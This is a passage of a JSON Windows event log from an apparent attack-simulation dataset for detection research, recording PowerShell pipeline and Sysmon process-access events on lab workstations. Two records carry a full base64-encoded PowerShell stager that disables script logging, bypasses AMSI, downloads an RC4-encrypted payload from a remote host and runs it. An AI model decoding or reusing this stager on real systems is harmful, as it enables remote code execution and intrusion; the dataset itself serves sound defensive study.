value=\"241\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"242\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"243\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"244\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"245\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"246\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"247\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"248\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"249\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"250\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"251\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"252\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"253\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"254\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"255\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 29322\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:28:41","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-6F6D-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:28:40","@timestamp":"2020-09-22T08:28:41.534Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":214351,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 29324\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e866-5f64-1100-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:28:39","EventReceivedTime":"2020-09-22 04:28:41","@timestamp":"2020-09-22T08:28:41.535Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3779042,"SourceProcessId":"960","SourceThreadId":"2840","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-5400-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3516","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:28:39.873","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e866-5f64-1100-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:28:39","EventReceivedTime":"2020-09-22 04:28:41","@timestamp":"2020-09-22T08:28:41.535Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3779043,"SourceProcessId":"960","SourceThreadId":"2840","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-5400-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3516","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:28:39.873","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e866-5f64-1100-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:28:39","EventReceivedTime":"2020-09-22 04:28:41","@timestamp":"2020-09-22T08:28:41.536Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3779044,"SourceProcessId":"960","SourceThreadId":"9380","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-5400-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3516","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:28:39.873","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e866-5f64-1100-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:28:39","EventReceivedTime":"2020-09-22 04:28:41","@timestamp":"2020-09-22T08:28:41.536Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3779045,"SourceProcessId":"960","SourceThreadId":"9380","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-5400-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3516","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 